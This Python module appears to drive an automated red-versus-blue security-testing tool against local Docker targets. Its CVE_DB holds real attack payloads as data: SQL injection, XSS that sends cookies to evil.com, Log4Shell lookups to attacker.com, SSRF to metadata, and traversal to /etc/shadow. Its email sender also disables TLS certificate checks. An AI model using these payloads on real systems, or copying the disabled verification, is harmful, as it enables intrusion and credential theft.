"""
DataWatchDawgs — Battle Engine
Orchestrates the full Blue vs Red loop with real Docker targets.
 
Network-layer extension (attack_sim integration):
  Each battle now also fires a paired network-layer attack via NetworkAgent,
  extending coverage to both application AND network layers simultaneously.
 
  App layer  (Red Agent)      Network layer  (Network Agent)
  ────────────────────────    ─────────────────────────────
  SQLi                    +   Port Scan
  XSS                     +   Brute Force
  RCE                     +   C2 Beaconing
  SSRF                    +   Data Exfiltration
  Path Traversal          +   Traffic Flood
"""
import os, time, json, hashlib, logging, smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Callable, Optional
 
from agents.blue_agent import BlueAgent
from agents.red_agent import RedAgent
from agents.referee import Referee
 
# Network-layer agent (attack_sim integration — Use 1)
try:
    from agents.network_agent import NetworkAgent, NETWORK_ATTACK_META
    from core.network_battle_engine import NetworkBattleEngine, NETWORK_VULN_DB
    NETWORK_AVAILABLE = True
except ImportError as _net_err:
    NETWORK_AVAILABLE = False
    logging.getLogger("dwd.engine").warning(
        "Network agent not available: %s — battles will be app-layer only", _net_err
    )
 
# Maps each app-layer vuln type to its paired network-layer attack (Use 1 table)
NETWORK_PAIR = {
    "sqli":  "port_scan",
    "xss":   "brute_force",
    "rce":   "c2_beacon",
    "ssrf":  "data_exfiltration",
    "path":  "traffic_flood",
}
 
logger = logging.getLogger("dwd.engine")
 
CVE_DB = {
    "sqli": {
        "id": "CVE-2026-1234", "name": "SQL Injection in /api/users endpoint",
        "cvss": 9.8, "loc": "src/routes/users.py:47", "type": "Critical", "type_key": "sqli",
        "desc": "Unsanitized user input flows directly into SQL query via f-string interpolation.",
        "payloads": ["' OR '1'='1", "'; DROP TABLE users;--", "' UNION SELECT username,password FROM users--", "1 AND SLEEP(5)--", "' OR 1=1 LIMIT 1--"],
    },
    "xss": {
        "id": "CVE-2026-2345", "name": "Stored XSS in comment rendering",
        "cvss": 7.5, "loc": "src/components/CommentCard.tsx:23", "type": "High", "type_key": "xss",
        "desc": "User-controlled input rendered in DOM without sanitization enabling stored XSS.",
        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>", "<svg onload=fetch('//evil.com?c='+document.cookie)>", "javascript:alert(1)", "<body onload=alert(1)>"],
    },
    "rce": {
        "id": "CVE-2021-44228", "name": "Log4Shell — JNDI injection RCE",
        "cvss": 10.0, "loc": "pom.xml:log4j-core:2.14.1", "type": "Critical", "type_key": "rce",
        "desc": "Apache Log4j2 JNDI lookup allows remote class loading via crafted log messages.",
        "payloads": ["${jndi:ldap://attacker.com/exploit}", "${${::-j}${::-n}${::-d}${::-i}:ldap://x.com/a}", "${jndi:rmi://attacker.com/exploit}", "${${lower:j}ndi:ldap://x.com/a}", "${jndi:dns://attacker.com/test}"],
    },
    "ssrf": {
        "id": "CVE-2026-3456", "name": "SSRF via PDF generation endpoint",
        "cvss": 9.1, "loc": "src/services/pdf_generator.py:112", "type": "Critical", "type_key": "ssrf",
        "desc": "PDF generator fetches user-supplied URLs without domain allowlist.",
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://localhost:6379/", "file:///etc/passwd", "http://internal.corp/admin", "dict://localhost:6379/info"],
    },
    "path": {
        "id": "CVE-2026-4567", "name": "Path traversal in file upload handler",
        "cvss": 8.2, "loc": "src/handlers/upload.go:89", "type": "High", "type_key": "path",
        "desc": "File upload handler uses unsanitized filename allowing path traversal.",
        "payloads": ["../../../etc/passwd", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fshadow", "../../../var/www/html/shell.php", "..\\..\\..\\windows\\system32\\cmd.exe"],
    },
}
 
 
class BattleEngine:
    def __init__(self, max_rounds: int = 5, emit_fn: Optional[Callable] = None,
                 enable_network: bool = True,
                 sentinel_port: int = 6100, sentinel_host: str = "127.0.0.1"):
        self.max_rounds = max_rounds
        self.emit = emit_fn or (lambda ev, data: None)
        self.blue = BlueAgent()
        self.red = RedAgent()
        self.referee = Referee()
        self.battles = []
        self.cycle = 156
 
        # Network-layer extension (attack_sim — Use 1, 3, 4, 5)
        self.net_engine = None
        if enable_network and NETWORK_AVAILABLE:
            try:
                self.net_engine = NetworkBattleEngine(
                    max_rounds=max_rounds,
                    emit_fn=self.emit,
                    target=sentinel_host,
                    port=sentinel_port,
                )
                logger.info("Network Battle Engine ready — dual-layer attacks enabled")
            except Exception as e:
                logger.warning("Network engine init failed: %s — app-layer only", e)
 
        # Try to load Docker manager
        self.docker = None
        self._init_docker()
 
    def _init_docker(self):
        try:
            import subprocess, shutil
            docker_exe = shutil.which("docker") or "docker"
            result = subprocess.run(
                [docker_exe, "info"],
                capture_output=True, timeout=10
            )
            if result.returncode == 0:
                from battlefield.docker_manager import DockerManager
                self.docker = DockerManager()
                logger.info("Docker available — real battlefield active")
            else:
                logger.info("Docker not running — simulation mode")
        except Exception as e:
            logger.info(f"Docker not available — simulation mode: {e}")
 
    def run(self, vuln_key: str) -> dict:
        cve = CVE_DB.get(vuln_key, CVE_DB["sqli"])
        battle_id = f"DWD-{int(time.time())}-{cve['id'].replace('-','')}"
        started = time.time()
 
        self._emit("battle_start", {
            "battle_id": battle_id,
            "cve_id": cve["id"],
            "cve_name": cve["name"],
            "cvss": cve["cvss"],
            "type": cve["type"],
            "desc": cve["desc"],
        })
        self._log("INFO", "orchestra...", "la-orch",
                  f"Battle started: {cve['id']} — {cve['name']}")
 
        # Deploy vulnerable Docker target
        target_url = None
        docker_active = False
 
        if self.docker and self.docker.docker_available:
            self._log("INFO", "orchestra...", "la-orch",
                      f"Deploying vulnerable {vuln_key} container...")
            try:
                target = self.docker.deploy_vulnerable(vuln_key)
                if target.running:
                    target_url = target.url
                    docker_active = True
                    self._log("SUCCESS", "orchestra...", "la-orch",
                              f"Vulnerable target live at {target_url}")
                else:
                    self._log("WARNING", "orchestra...", "la-orch",
                              "Container failed to start — simulation mode")
            except Exception as e:
                self._log("WARNING", "orchestra...", "la-orch",
                          f"Docker deploy failed: {e} — simulation mode")
        else:
            self._log("INFO", "orchestra...", "la-orch",
                      "Docker not available — running in simulation mode")
 
        rounds = []
        red_feedback = None
        final_verdict = None
 
        for round_num in range(1, self.max_rounds + 1):
 
            # BLUE: Propose patch
            self._emit("round_phase", {"round": round_num, "phase": "blue"})
            self._log("INFO", "blue:", "la-blue",
                      f"Round {round_num}: Analyzing {cve['id']} and generating patch...")
            time.sleep(0.3)
 
            patch = self.blue.propose(cve, round_num, red_feedback)
            self._emit("blue_patch", patch.to_dict())
            self._log("INFO", "blue:", "la-blue",
                      f"Round {round_num}: Patch {patch.patch_id} ready — confidence {patch.confidence:.0%}")
 
            # Deploy patched container on round 2+
            if docker_active and round_num > 1:
                self._log("INFO", "blue:", "la-blue",
                          f"Applying patch to container — rebuilding...")
                try:
                    patched_target = self.docker.deploy_patched(vuln_key)
                    if patched_target.running:
                        target_url = patched_target.url
                        self._log("SUCCESS", "blue:", "la-blue",
                                  "Patched container deployed — Red Agent attacking now")
                    else:
                        self._log("WARNING", "blue:", "la-blue",
                                  "Patched container failed — continuing with previous")
                except Exception as e:
                    self._log("WARNING", "blue:", "la-blue",
                              f"Patch deploy error: {e}")
 
            # RED: Attack (Application Layer)
            self._emit("round_phase", {"round": round_num, "phase": "red"})
            payload_hint = cve["payloads"][min(round_num-1, 4)]
            self._log("INFO", "red:", "la-red",
                      f"Round {round_num}: [App Layer] Firing payload -> {payload_hint[:50]}...")
            time.sleep(0.3)
 
            exploit = self.red.attack(cve, patch, round_num, target_url)
            self._emit("red_result", exploit.to_dict())
 
            if exploit.success:
                self._log("ERROR", "red:", "la-red",
                          f"Round {round_num}: EXPLOIT CONFIRMED — {exploit.technique} | {exploit.evidence[:60]}")
                if exploit.http_status:
                    self._log("ERROR", "red:", "la-red",
                              f"HTTP {exploit.http_status} — Response: {exploit.response_snippet[:80]}")
            else:
                self._log("SUCCESS", "red:", "la-red",
                          f"Round {round_num}: All {exploit.payloads_tried} payloads BLOCKED")
                if exploit.http_status:
                    self._log("SUCCESS", "red:", "la-red",
                              f"HTTP {exploit.http_status} — Target returned clean response")
 
            # NETWORK: Attack (Network Layer — Use 1)
            net_exploit_dict = None
            if self.net_engine and NETWORK_AVAILABLE:
                net_type = NETWORK_PAIR.get(vuln_key)
                if net_type:
                    net_meta = NETWORK_ATTACK_META.get(net_type, {})
                    self._log("INFO", "network:", "la-red",
                              f"Round {round_num}: [Network Layer] Firing {net_type} "
                              f"({net_meta.get('layer','?')} layer) — dual-stack attack")
                    try:
                        net_exploit_dict = self.net_engine.run_network_phase(
                            attack_type=net_type,
                            round_num=round_num,
                            target_url=target_url,
                        )
                        net_success = net_exploit_dict.get("success", False)
                        net_evidence = net_exploit_dict.get("evidence", "")
                        self._log(
                            "ERROR" if net_success else "SUCCESS",
                            "network:", "la-red",
                            f"Round {round_num}: [Network Layer] {net_type.upper()} — "
                            f"{'UNDETECTED' if net_success else 'BLOCKED'} — {net_evidence[:60]}",
                        )
                    except Exception as ne:
                        self._log("WARNING", "network:", "la-red",
                                  f"Network phase error: {ne}")
 
            # REFEREE: Judge
            self._emit("round_phase", {"round": round_num, "phase": "referee"})
            time.sleep(0.2)
 
            verdict = self.referee.judge(cve, patch, exploit, round_num)
            self._emit("referee_verdict", verdict.to_dict())
            final_verdict = verdict
            red_feedback = exploit.to_feedback()
 
            rounds.append({
                "round": round_num,
                "patch": patch.to_dict(),
                "exploit": exploit.to_dict(),
                "verdict": verdict.to_dict(),
                "network_exploit": net_exploit_dict,
            })
 
            self._log(
                "SUCCESS" if verdict.is_pass else "ERROR",
                "orchestra...", "la-orch",
                f"Round {round_num}: REFEREE -> {verdict.emoji} {verdict.verdict} "
                f"({verdict.patch_effectiveness:.0%} effective) — {verdict.proof_statement[:70]}..."
            )
 
            if verdict.is_pass:
                self._log("SUCCESS", "orchestra...", "la-orch",
                          f"Battle COMPLETE: {cve['id']} VERIFIED in {round_num} round(s). Deploying patch.")
                break
 
            if round_num < self.max_rounds:
                self._log("WARNING", "blue:", "la-blue",
                          f"Patch evolution triggered — round {round_num+1} starting")
 
        # Teardown Docker
        if docker_active and self.docker:
            try:
                self.docker.teardown(vuln_key)
                self._log("INFO", "orchestra...", "la-orch",
                          f"Container torn down — battlefield clean")
            except Exception:
                pass
 
        # Finalize
        self.cycle += 1
        duration = round(time.time() - started, 1)
        total_exploits = sum(r["exploit"]["payloads_tried"] for r in rounds)
 
        net_rounds = [r for r in rounds if r.get("network_exploit")]
        net_undetected = sum(
            1 for r in net_rounds if r["network_exploit"].get("success", False)
        )
        net_blocked = len(net_rounds) - net_undetected
 
        record = {
            "battle_id": battle_id,
            "cve_id": cve["id"],
            "cve_name": cve["name"],
            "vuln_type": cve["type_key"],
            "cvss": cve["cvss"],
            "final_verdict": final_verdict.verdict if final_verdict else "FAIL",
            "patch_effectiveness": final_verdict.patch_effectiveness if final_verdict else 0.0,
            "confidence": final_verdict.confidence if final_verdict else 0.0,
            "proof_statement": final_verdict.proof_statement if final_verdict else "",
            "signature": final_verdict.signature if final_verdict else "",
            "battle_hash": final_verdict.battle_hash if final_verdict else "",
            "rounds": rounds,
            "total_rounds": len(rounds),
            "total_exploits": total_exploits,
            "duration": duration,
            "cycle": self.cycle,
            "docker_used": docker_active,
            "network_layer": {
                "enabled": self.net_engine is not None,
                "paired_attack": NETWORK_PAIR.get(vuln_key),
                "rounds_fired": len(net_rounds),
                "undetected": net_undetected,
                "blocked": net_blocked,
            },
        }
 
        self.battles.append(record)
        self._save_audit(record)
        self._emit("battle_complete", record)
        self._send_email(record, cve)
        self._emit("cycle_update", {"cycle": self.cycle})
        return record
 
    def _emit(self, event, data):
        try:
            self.emit(event, data)
        except Exception:
            pass
 
    def _log(self, level, agent, agent_class, msg):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        lvc = {
            "INFO": "lv-info", "SUCCESS": "lv-success",
            "ERROR": "lv-error", "WARNING": "lv-warn"
        }.get(level, "lv-info")
        self._emit("op_log", {
            "ts": ts, "lv": level, "lvc": lvc,
            "ag": agent, "ac": agent_class, "msg": msg
        })
 
    def _save_audit(self, record):
        os.makedirs("audit_logs", exist_ok=True)
        path = f"audit_logs/{record['battle_id']}.json"
        with open(path, "w") as f:
            json.dump(record, f, indent=2, default=str)
        logger.info(f"Audit saved: {path}")
 
    def _send_email(self, record, cve):
        sender = os.getenv("GMAIL_SENDER", "")
        pwd = os.getenv("GMAIL_APP_PASSWORD", "")
        recipient = os.getenv("GMAIL_RECIPIENT", "")
        if not sender or not pwd or not recipient:
            return
 
        is_pass = record["final_verdict"] == "PASS"
        color = "#004422" if is_pass else "#440011"
        verdict_color = "#00ff88" if is_pass else "#ff3355"
        emoji = "PASS" if is_pass else "FAIL"
 
        rounds_html = ""
        for r in record["rounds"]:
            rv = r["verdict"]
            re_r = r["exploit"]
            bp = r["patch"]
            rc = "#00ff88" if rv["verdict"] == "PASS" else "#ff3355"
            http_info = f" | HTTP {re_r.get('http_status','?')}" if re_r.get('http_status') else ""
            docker_info = " | Real HTTP attack" if re_r.get('http_status') else " | Simulation"
            rounds_html += f"""
<div style="padding:8px;border-left:2px solid {rc};margin-bottom:8px;background:#0a1010;">
  <b style="color:{rc};">Round {r['round']} — {rv['verdict']}</b>{http_info}{docker_info}<br>
  <span style="color:#567a68;font-size:11px;">Blue: {bp['root_cause'][:80]}</span><br>
  <span style="color:#567a68;font-size:11px;">Red: {re_r['technique']} — {'BLOCKED' if not re_r['success'] else 'SUCCEEDED'}</span><br>
  {f'<span style="color:#ff3355;font-size:11px;">Evidence: {re_r["evidence"][:100]}</span><br>' if re_r['success'] else ''}
  <span style="color:#b8dcc8;font-size:11px;">{rv['proof_statement'][:120]}</span>
</div>"""
 
        html = f"""<!DOCTYPE html>
<html><body style="background:#050808;color:#b8dcc8;font-family:monospace;padding:20px;">
<div style="background:{color};padding:16px;border-radius:6px;margin-bottom:16px;border:1px solid {verdict_color};">
  <h1 style="color:{verdict_color};margin:0;font-size:18px;">DataWatchDawgs — {emoji} {record['final_verdict']}</h1>
  <p style="margin:4px 0 0;color:#567a68;font-size:11px;">
    Battle {record['battle_id']} | {record['cve_id']} |
    {'Real Docker Attack' if record.get('docker_used') else 'Simulation Mode'}
  </p>
</div>
<div style="background:#0d1616;border:1px solid #162828;border-radius:6px;padding:14px;margin-bottom:12px;">
  <h2 style="font-size:11px;color:#567a68;text-transform:uppercase;margin:0 0 10px;">Vulnerability</h2>
  <table style="width:100%;font-size:11px;">
    <tr><td style="color:#567a68;">CVE</td><td>{cve['id']}</td></tr>
    <tr><td style="color:#567a68;">Name</td><td>{cve['name']}</td></tr>
    <tr><td style="color:#567a68;">CVSS</td><td style="color:{'#ff3355' if cve['cvss']>=9 else '#ffaa00'};">{cve['cvss']}/10.0</td></tr>
    <tr><td style="color:#567a68;">Rounds</td><td>{record['total_rounds']}</td></tr>
    <tr><td style="color:#567a68;">Effectiveness</td><td style="color:{verdict_color};">{record['patch_effectiveness']:.0%}</td></tr>
    <tr><td style="color:#567a68;">Duration</td><td>{record['duration']}s</td></tr>
  </table>
</div>
<div style="background:#0d1616;border:1px solid #162828;border-radius:6px;padding:14px;margin-bottom:12px;">
  <h2 style="font-size:11px;color:#567a68;text-transform:uppercase;margin:0 0 10px;">Battle Transcript</h2>
  {rounds_html}
</div>
<div style="background:#020d06;border:1px solid #008844;border-radius:4px;padding:12px;margin-bottom:12px;">
  <div style="font-size:9px;color:#008844;margin-bottom:6px;letter-spacing:0.1em;">MATHEMATICAL PROOF</div>
  <div style="color:#00ff88;font-size:12px;">{record['proof_statement']}</div>
  <div style="font-size:9px;color:#2a4a38;margin-top:6px;">HMAC-SHA256: {record['signature']} | {record['battle_id']}</div>
</div>
<div style="font-size:9px;color:#2a4a38;margin-top:16px;border-top:1px solid #162828;padding-top:8px;">
DataWatchDawgs Autonomous Security v2 | {record['battle_id']}
</div>
</body></html>"""
 
        try:
            msg = MIMEMultipart("alternative")
            msg["Subject"] = (
                f"[DataWatchDawgs {'PASS' if is_pass else 'FAIL'}] "
                f"{cve['id']} — {cve['name']} | "
                f"{record['patch_effectiveness']:.0%} effective"
            )
            msg["From"] = f"DataWatchDawgs <{sender}>"
            msg["To"] = recipient
            msg.attach(MIMEText(
                f"DataWatchDawgs\n{record['final_verdict']}: {cve['id']}\n"
                f"Proof: {record['proof_statement']}", "plain"
            ))
            msg.attach(MIMEText(html, "html"))
 
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
 
            with smtplib.SMTP("smtp.gmail.com", 587) as s:
                s.ehlo()
                s.starttls(context=ctx)
                s.ehlo()
                s.login(sender, pwd)
                s.sendmail(sender, [recipient], msg.as_string())
 
            logger.info(f"Email sent for {record['battle_id']}")
        except Exception as e:
            logger.warning(f"Email failed: {e}")
 
    def get_stats(self):
        total = len(self.battles)
        passed = sum(1 for b in self.battles if b["final_verdict"] == "PASS")
        net_total = sum(b.get("network_layer", {}).get("rounds_fired", 0) for b in self.battles)
        net_blocked = sum(b.get("network_layer", {}).get("blocked", 0) for b in self.battles)
        net_undetected = sum(b.get("network_layer", {}).get("undetected", 0) for b in self.battles)
        return {
            "total": total,
            "passed": passed,
            "failed": total - passed,
            "pass_rate": round(passed / total, 3) if total else 0,
            "cycle": self.cycle,
            "docker_available": self.docker.docker_available if self.docker else False,
            "network_layer": {
                "enabled": self.net_engine is not None,
                "total_attacks": net_total,
                "blocked": net_blocked,
                "undetected": net_undetected,
                "block_rate": round(net_blocked / net_total, 3) if net_total else 0,
            },
        }
 
    # Use 3: SOC Training
    def run_soc_training(self, attack_type: str, soc_response: dict = None) -> dict:
        if not self.net_engine:
            return {"error": "Network engine not available"}
        return self.net_engine.run_soc_training(attack_type, soc_response)
 
    # Use 4: Firewall/WAF Rule Verification
    def run_firewall_verification(self, attack_type: str, proposed_rule: str = None) -> dict:
        if not self.net_engine:
            return {"error": "Network engine not available"}
        return self.net_engine.run_firewall_verification(attack_type, proposed_rule)
 
    # Use 5: Continuous Red Team Automation
    def run_full_red_team(self, target_url: str = None, options_map: dict = None) -> dict:
        if not self.net_engine:
            return {"error": "Network engine not available"}
        return self.net_engine.run_full_red_team(target_url, options_map)